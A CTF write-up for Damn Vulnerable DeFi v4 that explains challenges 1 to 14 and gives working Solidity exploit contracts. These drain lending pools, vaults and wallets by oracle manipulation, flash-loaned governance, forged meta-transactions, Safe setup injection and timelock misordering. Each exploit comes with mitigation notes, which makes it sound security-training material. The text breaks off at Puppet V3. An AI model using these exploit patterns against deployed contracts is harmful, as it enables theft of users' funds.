# Damn Vulnerable DeFi v4 Writeup
by tinamints

## 1. Unstoppable
An ERC4626 vault that offers free flashloans that is vulnerable to DoS via strict balance invariant.
### objective(s) :
- Halt the vault.
### vulnerability :
- `flashLoan` requires `convertToShares(totalSupply) == balanceBefore`. This assumes the vault's token balance only grows through `deposit` (which mints shares). A direct `transfer` raises the balance without minting shares, so the check fails and every `flashLoan` reverts.
### exploit :
- Transfer 1 wei of DVT straight to the vault with `token.transfer`, which permanently breaks the check.
### mitigation :
- Here, simply remove the redundant `convertToShares(totalSupply) != balanceBefore` check. it adds no security value (`ERC20(_token).safeTransferFrom(address(receiver), address(this), amount + fee);` is what enforces repayment).
### POC
```solidity
function test_unstoppable() public checkSolvedByPlayer {
    token.transfer(address(vault), 1);
}
```

## 2. Naive Receiver
A WETH flashloan pool with a fixed 1 WETH fee and meta-transaction support. vulnerable to unauthorized loans and sender spoofing.
### objective(s) :
- Drain all WETH from both the receiver (10 WETH) and the pool (1000 WETH) into recovery.
### constraint(s) :
- ≤2 transactions limited
### vulnerability :
- Anyone can call `flashLoan` with any `receiver`, and the receiver never checks who started the loan. So an attacker can make the receiver pay the 1 WETH fee over and over. all fees go to the pool's `feeReceiver` (the deployer).
- the pool's `withdraw` uses `_msgSender()`, which trusts the last 20 bytes of calldata when the call comes from the trusted forwarder. Through the forwarder + `multicall`, an attacker can append any address and withdraw as the deployer(it's the only address that has enough credit to withdraw the pool's full balance).
### exploit :
- Batch 10 zero-amount `flashLoan` calls to the receiver in one `multicall`, draining its 10 WETH as fees into the deployer's deposit.
- Withdraw the pool's whole balance as the deployer and send it to recovery, by routing a forged `withdraw` call through the trusted forwarder.
### mitigation :
- Authenticate the real loan initiator (don't let a receiver be billed for a loan it didn't request) and don't trust a forwarder's `_msgSender()` for `withdraw`. use proper access control/ verify the trusted forwarder.
### POC
```solidity
function test_naiveReceiver() public checkSolvedByPlayer {
    //drain receiver by making it pay fee 10 times
    bytes[] memory data = new bytes[](10);
    for (uint256 i = 0; i < 10; i++) {
        data[i] = abi.encodeWithSignature(
            "flashLoan(address,address,uint256,bytes)",
            address(receiver),
            address(weth),
            0,
            ""
        );
    }
    pool.multicall(data);

    //crafted withdraw call, with deployer's address forged on as the "from" suffix
    bytes memory withdrawCall = abi.encodeCall(
        pool.withdraw, (weth.balanceOf(address(pool)), payable(recovery))
    );
    bytes memory forgedCall = abi.encodePacked(withdrawCall, deployer);

    bytes[] memory calls = new bytes[](1);
    calls[0] = forgedCall;

    bytes memory multicallData = abi.encodeCall(pool.multicall, (calls));

    //sign forwarder request
    BasicForwarder.Request memory request = BasicForwarder.Request({
        from: player,
        target: address(pool),
        value: 0,
        gas: 100_000,
        nonce: forwarder.nonces(player),
        data: multicallData,
        deadline: block.timestamp + 1 days
    });

    // EIP-712 digest, built by hand since _hashTypedData is internal to the forwarder
    bytes32 structHash = forwarder.getDataHash(request);
    bytes32 digest = keccak256(abi.encodePacked("\x19\x01", forwarder.domainSeparator(), structHash));
    (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, digest);
    bytes memory signature = abi.encodePacked(r, s, v);

    // Execute the forwarder request with the forged calldata
    forwarder.execute(request, signature);
}
```

## 3. Truster
A DVT flashloan pool that makes an arbitrary call on the borrower's behalf, vulnerable to unchecked external calls.
### objective(s) :
- Rescue all 1M DVT from the pool to recovery.
### constraint(s) :
- Use only 1 transaction.
### vulnerability :
- `flashLoan(amount, borrower, target, data)` runs `target.functionCall(data)` with the pool as `msg.sender`, and the loan amount can be 0 So anyone can make the pool call any function on any contract.
### exploit :
- Take a 0 DVT loan with `target = token` and `data = approve(attacker, all tokens)`, so the pool approves the attacker. Then `transferFrom` everything to recovery. Both happen inside one attacker contract, so it's 1 transaction.
### mitigation :
- Never let the pool make an arbitrary `target.call(data)` with its own authority. drop the user-supplied call, or whitelist the target/selector so it can't call the token's `approve`.
### POC
```solidity
function test_truster() public checkSolvedByPlayer {
    Attacker attacker = new Attacker(pool, recovery, token, TOKENS_IN_POOL);
    attacker.attack();
}

contract Attacker {
    TrusterLenderPool private pool;
    address private recovery;
    DamnValuableToken private token;
    uint256 private TOKENS_IN_POOL;

    constructor(
        TrusterLenderPool _pool,
        address _recovery,
        DamnValuableToken _token,
        uint256 _TOKENS_IN_POOL
    ) {
        pool = _pool;
        recovery = _recovery;
        token = _token;
        TOKENS_IN_POOL = _TOKENS_IN_POOL;
    }

    function attack() external {
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            TOKENS_IN_POOL
        );
        pool.flashLoan(0, address(this), address(token), data);


        token.transferFrom(address(pool), recovery, TOKENS_IN_POOL);
    }
}
```

## 4. Side Entrance
An ETH pool with deposits, withdrawals and free flashloans, vulnerable to repaying a loan with a deposit.
### objective(s) :
- Rescue all 1000 ETH from the pool to recovery.
### vulnerability :
- `flashLoan` only checks that the pool's ETH balance is back to its old value. It doesn't care how the ETH came back, so depositing the borrowed ETH counts as repayment and also credits the attacker's `balances`.
### exploit :
- Flashloan all 1000 ETH, and inside `execute` call `deposit` with it. The loan passes the check, and the attacker now has a 1000 ETH balance. Call `withdraw` and send the ETH to recovery.
### mitigation :
- Don't let a `deposit` during the loan count as repayment. add a reentrancy guard shared by `flashLoan` and `deposit`, or track repayment separately from user deposits.
### POC
```solidity
function test_sideEntrance() public checkSolvedByPlayer {
    SideEntranceExploit exploit = new SideEntranceExploit(pool, recovery);
    exploit.exploit();
}

contract SideEntranceExploit  {
    SideEntranceLenderPool private pool;
    address private recovery;

    constructor(SideEntranceLenderPool _pool, address _recovery) {
        pool = _pool;
        recovery = _recovery;
    }

    function exploit() external {
        uint256 poolBalance = address(pool).balance;
        pool.flashLoan(poolBalance);


        pool.withdraw();
        payable(recovery).transfer(address(this).balance);
    }


    function execute() external payable {
        //this satisfies the payback check and gets the balance that is required in withdraw()
        pool.deposit{value: msg.value}();
    }

    receive() external payable {}
}
```

## 5. The Rewarder
A Merkle-proof reward distributor for DVT and WETH, vulnerable to claiming the same reward multiple times.

*the answer is from `https://github.com/RealJohnnyTime/damn-vulnerable-defi-v4-solutions/tree/master/test/the-rewarder`
### objective(s) :
- Rescue as many funds as possible from the distributor to recovery (leaving only dust).
### constraint(s) :
- The player is a beneficiary, so they can claim.
### vulnerability :
- `claimRewards` takes a list of claims but only checks and sets the "already claimed" bit when the token changes or at the last claim. Repeated claims for the same token and batch in one call are never checked against each other.
### exploit :
- Build a claims array that repeats the player's valid DVT claim (with its Merkle proof) enough times to empty the DVT, then the same for WETH. Call `claimRewards` once, then send everything to recovery.
### mitigation :
- Mark each claim as used (set its claimed bit) before/within the loop and reject duplicate (token, batch) claims, so the same reward can't be claimed repeatedly in one call.
### POC
```solidity
 function test_theRewarder() public checkSolvedByPlayer {
        // Read DVT distribution JSON
        string memory dvtJson = vm.readFile(
            "test/the-rewarder/dvt-distribution.json"
        );
        Reward[] memory dvtRewards = abi.decode(
            vm.parseJson(dvtJson),
            (Reward[])
        );
        // Read WETH distribution
        string memory wethJson = vm.readFile(
            "test/the-rewarder/weth-distribution.json"
        );
        Reward[] memory wethRewards = abi.decode(
            vm.parseJson(wethJson),
            (Reward[])
        );
        // Load leaves
        bytes32[] memory dvtLeaves = _loadRewards(
            "/test/the-rewarder/dvt-distribution.json"
        );
        bytes32[] memory wethLeaves = _loadRewards(
            "/test/the-rewarder/weth-distribution.json"
        );

        // Find player's reward amounts and leaves
        uint256 playerDvtAmount;
        bytes32[] memory playerDvtProof;
        uint256 playerWethAmount;
        bytes32[] memory playerWethProof;
        //NOTE (tina): assume that dvtRewards.length == wethRewards.length
        for (uint i = 0; i < dvtRewards.length; i++) {
            if (dvtRewards[i].beneficiary == player) {
                playerDvtAmount = dvtRewards[i].amount;
                playerWethAmount = wethRewards[i].amount;
                playerDvtProof = merkle.getProof(dvtLeaves, i);
                playerWethProof = merkle.getProof(wethLeaves, i);
                break;
            }
        }
        require(playerDvtAmount > 0, "Player not found in DVT distribution");
        require(playerWethAmount > 0, "Player not found in WETH distribution");

        // Set up token claims
        IERC20[] memory tokensToClaim = new IERC20[](2);
        tokensToClaim[0] = IERC20(address(dvt));
        tokensToClaim[1] = IERC20(address(weth));

        // Calculate number of claims needed based on the total distribution and player's amounts
        uint256 totalClaimsNeeded = (TOTAL_DVT_DISTRIBUTION_AMOUNT /
            playerDvtAmount) +
            (TOTAL_WETH_DISTRIBUTION_AMOUNT / playerWethAmount);
        uint256 dvtClaims = TOTAL_DVT_DISTRIBUTION_AMOUNT / playerDvtAmount;
        Claim[] memory claims = new Claim[](totalClaimsNeeded);

        // Set up all claims
        // For example if totalClaimsNeeded = 100, and dvtClaims = 60, then wethClaims = 40
        // Input claims for example = [DVT, DVT, DVT, DVT, WETH, WETH, WETH]
        //NOTE (tina): Going through this loop uses more gas than Foundry's gas limit. When testing, add --gas-limit 9999999999999999
        for (uint256 i = 0; i < totalClaimsNeeded; i++) {
            claims[i] = Claim({
                batchNumber: 0,
                amount: i < dvtClaims ? playerDvtAmount : playerWethAmount,
                tokenIndex: i < dvtClaims ? 0 : 1,
                proof: i < dvtClaims ? playerDvtProof : playerWethProof
            });
        }

        distributor.claimRewards({
            inputClaims: claims,
            inputTokens: tokensToClaim
        });

        dvt.transfer(recovery, dvt.balanceOf(player));
        weth.transfer(recovery, weth.balanceOf(player));
    }
```

## 6. Selfie
A DVT flashloan pool controlled by token-vote governance, vulnerable to flash-loaned voting power.
### objective(s) :
- Drain all 1.5M DVT from the pool to recovery.
### vulnerability :
- Governance lets anyone queue an action if they hold more than half of the token's voting power *right now*. The pool also has `emergencyExit`, which sends all its funds anywhere and can only be called by governance. Voting power can be borrowed from the pool itself.
### exploit :
- Flashloan all pool tokens, delegate votes to yourself, and queue `emergencyExit(recovery)` as a governance action. Repay the loan, wait out the 2-day delay with `vm.warp`, then execute the action.
### mitigation :
- Base voting power on checkpointed/time-weighted balances held before the proposal, so a flash-loaned balance in a single block can't reach quorum.
### POC
```solidity
 function test_selfie() public checkSolvedByPlayer {
        pool.flashLoan(this, address(token), TOKENS_IN_POOL, "");

        //2 day action delay
        vm.warp(block.timestamp + 2 days);

        governance.executeAction(1);
    }

    //this get called by the pool during flashLoan
    function onFlashLoan(address initiator, address _token, uint256 amount, uint256 fee, bytes calldata data)
        external
        override
        returns (bytes32)
    {
        //gain governance voting power
        token.delegate(address(this));

        //queue an action to call emergencyExit
        bytes memory emergencyExitData = abi.encodeWithSignature("emergencyExit(address)", recovery);
        governance.queueAction(address(pool), 0, emergencyExitData);

        // repay the pool
        token.approve(address(pool), amount);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
```

## 7. Compromised
An NFT exchange priced by a 3-source median oracle, vulnerable to leaked oracle keys.
### objective(s) :
- Drain all 999 ETH from the exchange to recovery.
### constraint(s) :
- The player must not own any NFT at the end.
- The NFT price must end unchanged.
### vulnerability :
- The two hex strings leaked in the challenge description decode (hex → base64 → text) to private keys of 2 of the 3 oracle sources. The price is the median of the 3, so controlling 2 sources means controlling the price.
### exploit :
- With the 2 keys, post a price of 0, buy 1 NFT for 1 wei, post the original 999 ETH price again, sell the NFT back for 999 ETH, and send the ETH to recovery.
### mitigation :
- Keep oracle signer keys secret and aggregate many independent sources with deviation checks (e.g. Chainlink), so leaking/controlling a couple of sources can't set the price.
### POC
```solidity
function test_compromised() public checkSolved {
        //set price to 0 buy low sell high
        // private keys leaked of 2 oracles decoded from the random number in README.md
        address source1 = sources[0]; // 0x188Ea627E3531Db590e6f1D71ED83628d1933088
        address source2 = sources[1]; // 0xA417D473c40a4d42BAd35f147c21eEa7973539D8
        
        vm.startPrank(source1);
        oracle.postPrice("DVNFT", 0);
        vm.stopPrank();
        
        vm.startPrank(source2);
        oracle.postPrice("DVNFT", 0);
        vm.stopPrank();
        
        vm.startPrank(player);
        uint256 nftId = exchange.buyOne{value: 1 wei}();

        nft.approve(address(exchange), nftId);
        vm.stopPrank();

        vm.startPrank(source1);
        oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
        vm.stopPrank();
        
        vm.startPrank(source2);
        oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
        vm.stopPrank();

        vm.startPrank(player);
        exchange.sellOne(nftId);
        
        payable(recovery).transfer(EXCHANGE_INITIAL_ETH_BALANCE);
        vm.stopPrank();
    }
```

## 8. Puppet
A DVT lending pool that prices collateral from a small Uniswap V1 pool, vulnerable to spot-price oracle manipulation.
### objective(s) :
- Drain all 100k DVT from the lending pool to recovery.
### constraint(s) :
- Use only 1 transaction.
### vulnerability :
- The pool asks for ETH collateral worth 2x the borrowed DVT, using the Uniswap V1 spot price (ETH balance/ DVT balance of the pair). The pair only has 10 ETH/ 10 DVT, so a single big swap moves the price massively.
### exploit :
- pull the player's 1000 DVT with an EIP-2612 `permit` signature (a signed approval, so no separate `approve` tx) Inside attacker contract, dump them into Uniswap V1 to crash the DVT price, then borrow all 100k DVT with the tiny collateral now required and send them to recovery.
### mitigation :
- Read the price from a manipulation-resistant oracle (TWAP / Chainlink), not instantaneous Uniswap V1 spot reserves.
### POC
```solidity
 function test_puppet() public checkSolvedByPlayer {
        PuppetPoolAttacker attacker = new PuppetPoolAttacker(
        address(token),
        address(lendingPool),
        address(uniswapV1Exchange),
        recovery
        );


        // Prepare EIP-2612 permit
        uint256 deadline = block.timestamp + 1 days;
        uint256 value    = type(uint256).max;
        uint256 nonce    = token.nonces(player);

        bytes32 PERMIT_TYPEHASH = keccak256(
            "Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)"
        );

        bytes32 structHash = keccak256(
            abi.encode(
                PERMIT_TYPEHASH,
                player,
                address(attacker),
                value,
                nonce,
                deadline
            )
        );

        bytes32 digest = keccak256(
            abi.encodePacked(
                "\x19\x01",
                token.DOMAIN_SEPARATOR(),
                structHash
            )
        );

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPrivateKey, digest);

        // 1 tx restriction
        attacker.attack{ value: 25 ether }(player, deadline, v, r, s);
    }

    contract PuppetPoolAttacker {
    DamnValuableToken public immutable token;
    PuppetPool public immutable lendingPool;
    IUniswapV1Exchange public immutable uniswapV1Exchange;
    address public immutable recovery;

    constructor(
        address _token,
        address _lendingPool,
        address _uniswapV1Exchange,
        address _recovery
    ) {
        token = DamnValuableToken(_token);
        lendingPool = PuppetPool(_lendingPool);
        uniswapV1Exchange = IUniswapV1Exchange(_uniswapV1Exchange);
        recovery = _recovery;
    }

    function attack(
        address player,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external payable {

        token.permit(
            player,
            address(this),
            type(uint256).max,
            deadline,
            v,
            r,
            s
        );

        require(msg.value == 25 ether, "NO ETH RECEIVED");


        uint256 playerTokens = token.balanceOf(player);
        token.transferFrom(player, address(this), playerTokens);


        uint256 attackerTokens = token.balanceOf(address(this));
        token.approve(address(uniswapV1Exchange), attackerTokens);

        uniswapV1Exchange.tokenToEthTransferInput(
            attackerTokens,
            9,
            block.timestamp + 1,
            address(this)
        );


        uint256 poolTokens = token.balanceOf(address(lendingPool));

        lendingPool.borrow{ value: 20 ether }(
            poolTokens,
            recovery
        );
    }

    receive() external payable {}
}
```

## 9. Puppet V2
A DVT lending pool that prices WETH collateral from Uniswap V2 reserves, vulnerable to spot-price oracle manipulation.
### objective(s) :
- Drain all 1M DVT from the lending pool to recovery.
### vulnerability :
- The pool asks for WETH collateral worth 3x the borrowed DVT, using the Uniswap V2 spot price from `getReserves`. The pair is small (100 DVT / 10 WETH), so selling the player's 10k DVT crashes the price.
### exploit :
- Sell all 10k DVT for ETH on Uniswap V2, wrap the ETH into WETH, approve the now-small collateral, borrow all 1M DVT, and send it to recovery.
### mitigation :
- Same as Puppet, value collateral with a TWAP/external oracle instead of the Uniswap V2 `getReserves` spot price.
### POC
```solidity
 function test_puppetV2() public checkSolvedByPlayer {
        token.approve(address(uniswapV2Router), PLAYER_INITIAL_TOKEN_BALANCE);
        
        address[] memory path = new address[](2);
        path[0] = address(token);
        path[1] = address(weth);
        
        //sell all tokens to dump the price
        uint256 tokensToSell = token.balanceOf(player);
        uniswapV2Router.swapExactTokensForETH(
            tokensToSell,         
            0,                    
            path,                 
            player,               
            block.timestamp + 1   
        );
        
        // Check required WETH then borrow cheaply
        uint256 poolTokens = token.balanceOf(address(lendingPool));
        uint256 requiredWETH = lendingPool.calculateDepositOfWETHRequired(poolTokens);
        
        // Convert ETH to WETH (collateral when calling borrow())
        uint256 ethBalance = address(player).balance;
        require(ethBalance >= requiredWETH, "Not enough ETH after swap");
        
        weth.deposit{value: ethBalance}();
        
        weth.approve(address(lendingPool), requiredWETH);
        
        lendingPool.borrow(poolTokens);
        
        uint256 borrowedTokens = token.balanceOf(player);
        token.transfer(recovery, borrowedTokens);
    }
```

## 10. Free Rider
An NFT marketplace selling 6 NFTs at 15 ETH each, vulnerable to broken payment logic in `buyMany`.
### objective(s) :
- Take all 6 NFTs from the marketplace and hand them to the recovery manager.
- The player earns the 45 ETH bounty.
### vulnerability :
- `buyMany` checks `msg.value >= price` separately for each NFT, so one 15 ETH payment passes the check for all 6.
- It also transfers the NFT to the buyer *before* paying the "owner", so the seller's payment goes to the buyer instead.
### exploit :
- Flash-swap 15 WETH from Uniswap V2, unwrap it, buy all 6 NFTs for 15 ETH (and get paid 90 ETH back), send the NFTs to the recovery manager to claim the 45 ETH bounty, repay the flash swap plus fee.
### mitigation :
- Charge the sum of each NFT's price (validate payment per item) and send proceeds to the seller (the owner *before* transfer), following checks-effects-interactions.
### POC
```solidity
 function test_freeRider() public checkSolvedByPlayer {
        flashLoanUser attacker = new flashLoanUser(
            address(marketplace),
            address(recoveryManager),
            address(nft),
            address(uniswapPair),
            address(token),
            address(weth),
            address(player)
        );
        //call flashLoanInitilizer to get flashloan 15 ETH (only need price of one NFT due to exploit)
        attacker.flashLoanInitilizer(15 ether);
    }

contract flashLoanUser is IUniswapV2Callee, IERC721Receiver {

FreeRiderNFTMarketplace public immutable marketplace;
FreeRiderRecoveryManager public immutable recoveryManager;
DamnValuableNFT public immutable nft;
IUniswapV2Pair public immutable pair;
address public immutable token;
address public immutable weth;
address public immutable player;

    constructor(
        address _marketplace,
        address _recoveryManager,
        address _nft,
        address _pair,
        address _token,
        address _weth,
        address _player
    ) {
        marketplace = FreeRiderNFTMarketplace(payable(_marketplace));
        recoveryManager = FreeRiderRecoveryManager(payable(_recoveryManager));
        nft = DamnValuableNFT(_nft);
        pair = IUniswapV2Pair(_pair);
        token = _token;
        weth = _weth;
        player = _player;
    }

    receive() external payable {}

    function flashLoanInitilizer(uint256 amount) external {
        //determine the right token to borrow
        address token0 = pair.token0();
        address token1 = pair.token1();

        uint256 amount0Out = 0;
        uint256 amount1Out = 0;

        if (token0 == address(weth)) {
            amount0Out = amount;
        } else {
            amount1Out = amount;
        }

        //call swap and activate flashloan
        pair.swap(amount0Out, amount1Out, address(this), abi.encode(amount));
    }

    //called by pair contract
    function uniswapV2Call(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
        ) external override {
        //security best practice
        require(msg.sender == address(pair), "Invalid caller");

        uint256 wethBorrowed = abi.decode(data, (uint256));

        //Convert WETH to ETH to buy NFTs
        WETH(payable(weth)).withdraw(wethBorrowed);

        uint256[] memory tokenIds = new uint256[](6);
        for (uint256 i = 0; i < 6; i++) {
            tokenIds[i] = i;
        }

        marketplace.buyMany{value: 15 ether}(tokenIds);

        for (uint256 i = 0; i < 6; i++) {
            nft.safeTransferFrom(address(this), address(recoveryManager), i, abi.encode(address(this)));
        }

        //convert to WETH to repay flashloan
        uint256 ethBalance = address(this).balance;
        WETH(payable(weth)).deposit{value: ethBalance}();

        uint256 amountToRepay = ((wethBorrowed * 1000) / 997) + 1;

        IERC20(weth).transfer(address(pair), amountToRepay);

        uint256 remainingWETH = IERC20(weth).balanceOf(address(this));

        if (remainingWETH > 0) {
            WETH(payable(weth)).withdraw(remainingWETH);
            payable(player).transfer(address(this).balance); //Send all ETH to player
        }
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) external pure override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }
}
```

## 11. Backdoor
A registry that pays 10 DVT to each Safe wallet created for its 4 beneficiaries, vulnerable to injected calls during wallet setup.
### objective(s) :
- Move all 40 DVT from the registry to recovery.
### constraint(s) :
- Use only 1 transaction.
### vulnerability :
- Anyone can create a Safe for a beneficiary through `createProxyWithCallback`, and the registry pays that new wallet. The registry checks the owner and threshold but not the optional `to`/`data` in Safe's `setup()`, which makes the new wallet delegatecall any contract.
### exploit :
- For each of the 4 users, create a Safe whose `setup()` delegatecalls to an attacker-controlled initializer that makes the wallet `approve` the attacker for DVT. The registry sends 10 DVT to the wallet and the attacker immediately `transferFrom`s it to recovery. All of this runs in one attacker constructor so it's 1 transaction.
### mitigation :
- Have the registry validate the new wallet's setup (expected owners, no modules/delegatecall/injected calls) before paying, instead of trusting arbitrary `initializer` calldata.
### POC
```solidity
 function test_backdoor() public checkSolvedByPlayer {
        new Attacker(
            address(walletFactory),
            address(singletonCopy),
            address(walletRegistry),
            address(token),
            recovery,
            users
        );
    }

    // Safe call this
contract Initializer {
    function approveTokens(address token, address spender) external {
        IERC20(token).approve(spender, type(uint256).max);
    }
}

contract Attacker {
    constructor(
        address _walletFactory,
        address _singletonCopy,
        address _walletRegistry,
        address _token,
        address _recovery,
        address[] memory users
    ) {
        Initializer init = new Initializer();

        for (uint256 i = 0; i < users.length; i++) {
            address[] memory owners = new address[](1);
            owners[0] = users[i];

            // Encode the `approveTokens` call
            bytes memory setupData = abi.encodeWithSelector(
                init.approveTokens.selector,
                _token,
                address(this)
            );

            // Encode Safe.setup() with the `to`/`data` fields inject our approveTokens call
            bytes memory initData = abi.encodeWithSignature(
                "setup(address[],uint256,address,bytes,address,address,uint256,address)",
                owners,          // owners
                1,               // threshold
                address(init), // to: called during setup
                setupData,       // data: approves this contract to spend wallet tokens
                address(0),      // fallbackHandler
                address(0),      // paymentToken
                0,               // payment
                address(0)       // paymentReceiver
            );

            // Deploy the proxy: WalletRegistry.proxyCreated() callback sends 10 DVT to the wallet
            address proxy = address(
                SafeProxyFactory(_walletFactory).createProxyWithCallback(
                    _singletonCopy,
                    initData,
                    i, // saltNonce: unique per user
                    IProxyCreationCallback(_walletRegistry)
                )
            );

            // Drain the 10 DVT that the registry just sent to the wallet loop 4x = 40 DVT
            IERC20(_token).transferFrom(proxy, _recovery, IERC20(_token).balanceOf(proxy));
        }
    }
}
```

## 12. Climber
A UUPS-upgradeable vault owned by a timelock, vulnerable to the timelock executing actions before checking they were scheduled.
### objective(s) :
- Drain all 10M DVT from the vault to recovery.
### vulnerability :
- `ClimberTimelock.execute()` runs every call first and only then checks that the operation was scheduled and ready. So a batch can schedule itself while it runs. And since the timelock owns the vault, its calls can upgrade the vault.
### exploit :
- Execute one batch that 1. sets the delay to 0 2. grants the proposer role to the attack contract 3. upgrades the vault to a malicious implementation 4. calls the attack contract which `schedule`s this same batch so the final check passes. Then call `sweepFunds` on the upgraded vault to send everything to recovery.
### mitigation :
- Check the operation is scheduled and ready BEFORE executing it (and mark it executed before the external calls).
### POC
```solidity
 function test_climber() public checkSolvedByPlayer {
        MaliciousVaultImpl maliciousImpl = new MaliciousVaultImpl();

        ClimberAttack attackContract = new ClimberAttack(
            payable(address(vault)),
            payable(address(timelock)),
            recovery,
            address(token)
        );

        attackContract.attack(address(maliciousImpl));
    }

    contract MaliciousVaultImpl is ClimberVault {
    function sweepFunds(address token, address to) external {
        SafeTransferLib.safeTransfer(token, to, IERC20(token).balanceOf(address(this)));
    }
}

contract ClimberAttack {
    ClimberVault private immutable vault;
    ClimberTimelock private immutable timelock;
    address private immutable recovery;
    address private immutable token;

    address[] private targets;
    uint256[] private values;
    bytes[] private dataElements;
    bytes32 private constant SALT = bytes32(0);

    constructor(address payable _vault, address payable _timelock, address _recovery, address _token) {
        vault = ClimberVault(_vault);
        timelock = ClimberTimelock(_timelock);
        recovery = _recovery;
        token = _token;
    }

    function attack(address maliciousImpl) external {
        targets.push(address(timelock));
        values.push(0);
        dataElements.push(abi.encodeWithSignature("updateDelay(uint64)", uint64(0)));

        targets.push(address(timelock));
        values.push(0);
        dataElements.push(
            abi.encodeWithSignature("grantRole(bytes32,address)", PROPOSER_ROLE, address(this))
        );

        targets.push(address(vault));
        values.push(0);
        dataElements.push(
            abi.encodeWithSignature("upgradeToAndCall(address,bytes)", maliciousImpl, bytes(""))
        );

        targets.push(address(this));
        values.push(0);
        dataElements.push(abi.encodeWithSignature("scheduleAll()"));

        timelock.execute(targets, values, dataElements, SALT);

        MaliciousVaultImpl(address(vault)).sweepFunds(token, recovery);
    }

    function scheduleAll() external {
        timelock.schedule(targets, values, dataElements, SALT);
    }
}
```

## 13. Wallet Mining
A wallet deployer that pays a reward for deploying Safes at authorized addresses, vulnerable to a storage-slot collision that allows re-initialization.
### objective(s) :
- Recover all 20M DVT from the user's deposit address back to the user, and send the wallet deployer's reward to the ward.
### constraint(s) :
- The user must not send any transaction. the player can send only 1.
### vulnerability :
- `AuthorizerUpgradeable`'s `needsInit` lives in storage slot 0, which collides with the proxy's `upgrader` address (always non-zero) so `init()` can be called again by anyone to authorize themselves.
- `WalletDeployer.drop()` only checks that the chosen `(wat, nonce)` pair CREATE2-deploys to the authorized address, so the right nonce can be brute-forced.
### exploit :
- Re-call `init()` to authorize the attacker for `USER_DEPOSIT_ADDRESS`. Brute-force the nonce that makes the factory deploy there, deploy the real Safe (owned by `user`) with `drop()`, drain it with the user's signature via `execTransaction`, and forward the deployer's reward to `ward`. All inside one attacker constructor.
### mitigation :
- Store the init flag in a dedicated, non-colliding slot (OZ `Initializable`) so `init()` can't be replayed, and don't fund a counterfactual address before verifying the deployed wallet's owner.
### POC
```solidity
function test_walletMining() public checkSolvedByPlayer {
    new Attacker(address(token), address(authorizer), address(walletDeployer), user, userPrivateKey, ward);
}

// use for 'hevm.sign(userPrivateKey, txHash)'
interface IHevm {
    function sign(uint256 privateKey, bytes32 digest) external pure returns (uint8 v, bytes32 r, bytes32 s);
}

contract Attacker {
    address constant USER_DEPOSIT_ADDRESS = 0xe8BbB8395a7984D06A794aE86e4D723526b55E98;
    IHevm constant hevm = IHevm(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    constructor(
        address token,
        address authorizer,
        address walletDeployer,
        address user,
        uint256 userPrivateKey,
        address ward
    ) {
        // 1. Get authorized
        getAuthorized(authorizer);

        // 2. Find the nonce
        bytes memory setupCalldata = _buildSetup(user);
        uint256 nonce = findNonce(walletDeployer, setupCalldata);

        // 3. Call drop() — deploys the Safe at USER_DEPOSIT_ADDRESS with `user` as owner,
        //    and pays 1 DVT to this contract (msg.sender)
        WalletDeployer(walletDeployer).drop(USER_DEPOSIT_ADDRESS, setupCalldata, nonce);

        // 4. Drain the Safe
        _drainSafe(token, user, userPrivateKey);

        // 5. Forward the reward
        IERC20(token).transfer(ward, IERC20(token).balanceOf(address(this)));
    }

    // 1. Slot 0 collision: needsInit reads the proxy's upgrader address (non-zero), so init()'s require passes again
    function getAuthorized(address authorizer) internal {
        address[] memory wards = new address[](1);
        wards[0] = address(this);
        address[] memory aims = new address[](1);
        aims[0] = USER_DEPOSIT_ADDRESS;
        AuthorizerUpgradeable(authorizer).init(wards, aims);
    }

    function _buildSetup(address user) internal pure returns (bytes memory) {
        address[] memory owners = new address[](1);
        owners[0] = user;
        return abi.encodeCall(
            Safe.setup, (owners, 1, address(0), bytes(""), address(0), address(0), 0, payable(address(0)))
        );
    }

    // 2. Brute-force nonces until SafeProxyFactory.createProxyWithNonce() would deploy to USER_DEPOSIT_ADDRESS
    function findNonce(address walletDeployer, bytes memory setupCalldata) internal view returns (uint256) {
        WalletDeployer wd = WalletDeployer(walletDeployer);
        bytes32 initCodeHash = keccak256(abi.encodePacked(type(SafeProxy).creationCode, uint256(uint160(wd.cpy()))));
        bytes32 initializerHash = keccak256(setupCalldata);
        address factory = address(wd.cook());
        for (uint256 n = 0; n < 1000; n++) {
            address predicted = address(uint160(uint256(keccak256(abi.encodePacked(
                bytes1(0xff), factory, keccak256(abi.encodePacked(initializerHash, n)), initCodeHash
            )))));
            if (predicted == USER_DEPOSIT_ADDRESS) {
                console.log("found nonce:", n);
                return n;
            }
        }
        revert("nonce not found in 0..999");
    }

    function _drainSafe(address token, address user, uint256 userPrivateKey) internal {
        Safe safe = Safe(payable(USER_DEPOSIT_ADDRESS));
        bytes memory transferCalldata = abi.encodeCall(
            IERC20.transfer, (user, IERC20(token).balanceOf(USER_DEPOSIT_ADDRESS))
        );
        bytes32 txHash = safe.getTransactionHash(
            token, 0, transferCalldata, Enum.Operation.Call, 0, 0, 0, address(0), address(0), 0
        );
        (uint8 v, bytes32 r, bytes32 s) = hevm.sign(userPrivateKey, txHash);
        safe.execTransaction(
            token, 0, transferCalldata, Enum.Operation.Call, 0, 0, 0, address(0), payable(address(0)),
            abi.encodePacked(r, s, v)
        );
    }
}
```

## 14. Puppet V3
A DVT lending pool that prices WETH collateral with a 10-minute Uniswap V3 TWAP, vulnerable to TWAP manipulation on a low-liquidity pool.
### objective(s) :
- Drain all 1M DVT from the lending pool to recovery.
### constraint(s) :
- Finish in under 115 seconds after setup.
### vulnerability :
- The pool uses a TWAP (time-weighted average price, the average price over a time window) of only 10 minutes, on a Uniswap V3 pool with little liquidity (100 DVT / 100 WETH). A big enough swap, held for even ~2 minutes drags the average down a lot.
### exploit :
